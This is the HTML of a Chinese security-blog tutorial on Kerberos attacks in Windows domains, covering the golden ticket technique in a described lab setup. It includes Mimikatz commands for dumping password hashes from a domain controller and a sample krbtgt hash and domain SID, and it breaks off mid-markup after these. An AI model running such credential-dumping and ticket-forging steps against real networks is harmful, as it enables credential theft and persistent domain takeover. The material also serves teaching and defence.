<html>
<head>
<title>内网渗透Kerberos协议相关安全问题分析与利用</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
内网渗透 | Kerberos 协议相关安全问题分析与利用
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    WHOAMI
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2021-06-26</em>
                </div>

                
                                                                                                                                                                                                                        <div id="js_tags"  class="article-tag__list" data-len="3">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                                                                <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1928066062302937090#wechat_redirect" data-tag_id="" data-album_id="1928066062302937090"  data-tag_source="0">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>内网渗透</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>20</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1928066062235828229#wechat_redirect" data-tag_id="" data-album_id="1928066062235828229"  data-tag_source="0">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>Kerberos协议</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>4</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1928066061682180099#wechat_redirect" data-tag_id="" data-album_id="1928066061682180099"  data-tag_source="0">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>基础知识</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>4</span>
                                                                            </div>
                                                                                    </div>
                                    </div><div id="weixin_content"><figure style="margin-right: 8px;margin-bottom: 1.5em;margin-left: 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;" data-mpa-powered-by="yiban.io"><img data-ratio="0.5625" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/1_hfVOeDdqzKJeGRajF2jNSnwdD8jWmw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlCVjmYrvFe991LjFXO0iciaelpUhfVOeDdqzKJeGRajF2jNSnwdD8jWmw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="848" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /></figure><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">前言</a></h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">往期文章：</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247497760&amp;idx=1&amp;sn=4c0f57ba9203cc115a85cd0c011fdc43&amp;chksm=ec1cad1fdb6b2409ec3ef25008ad6834a7220997a914308a478ed9d682c84c7b370e423a878c&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2"><strong>内网渗透 | Kerberos 协议与 Kerberos 认证原理</strong></a><br  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在上一节中我们说到过，Kerberos 认证并不是天衣无缝的，这其中也会有各种漏洞能够被我们利用，比如我们常说的 MS14-068、黄金票据、白银票据等就是基于Kerberos协议进行攻击的。下面我们便详细的讲解一下 Kerberos 认证中的相关安全问题。</p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">黄金票据（Golden ticket）</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在 Windows 的 kerberos 认证过程中，Client 将自己的信息发送给 KDC，然后 KDC 使用 Krbtgt 用户的 NTLM 哈希作为密钥进行加密，生成 TGT。那么如果获取到了 Krbtgt 的 NTLM 哈希值，不就可以伪造任意的 TGT 了吗。因为 Krbtgt 只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个后门。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">利用 Krbtgt 的 Hash 值可以伪造生成任意的 TGT，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于 Kerberos 认证的任何服务。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">攻击者再使用黄金票据进行票据传递攻击时，通常要掌握以下信息：</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>需要伪造的域管理员用户名</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>完整的域名</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域 SID</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>krbtgt 的 NTLM 哈希值</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">实验环境如下：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5695284159613059" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/2_Q87GKTTRZbAibniaJ1QGxEmX4IEVRA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlHxiaGUwpfwiacY80FpBtCN3JacU4Q87GKTTRZbAibniaJ1QGxEmX4IEVRA/640?wx_fmt=png'" data-type="png" data-w="827" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210522120058315</figcaption></figure><blockquote style="margin: 2em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgba(0, 0, 0, 0.5);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-left: none;padding: 1em;border-radius: 8px;background: rgb(247, 247, 247);"><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;">域成员主机：Windows 7</p><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>IP：192.168.93.20</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域名：whoamianony.org</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>用户名：bunny</span></p><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;">域控制器：Windows Server 2012</p><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>IP：192.168.93.30</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域名：whoamianony.org</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>用户名：administrator</span></p></blockquote><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">假设有这么一种情况，原先攻击机已拿到的域内所有的账户 Hash，包括 Krbtgt 这个账户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置 Krbtgt 密码，基于此条件，我们还能利用该票据重新获得域管理员权限。</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">Mimikatz 下的利用</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先，我们登上域控，上传 mimikatz，然后执行如下命令抓取 krbtgt 用户的 Hash 值并获取域sid：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">privilege</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">debug</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lsadump</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lsa </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">patch        </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">// 专用于在域控制器上导出用户密码或 hash</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.676663542642924" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/3_IunBjwGa61NVeeaJqibn5f2J6rJibg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBllgzEaXcJngWxrG9fPo7jVIVKzPIunBjwGa61NVeeaJqibn5f2J6rJibg/640?wx_fmt=png'" data-type="png" data-w="1067" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521085744602</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">得到 krbtgt 用户的 Hash 和 域 SID 分别为：</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>Hash 值：6be58bfcc0a164af2408d1d3bd313c2a</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域 SID：为 S-1-5-21-1315137663-3706837544-1429009142</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, 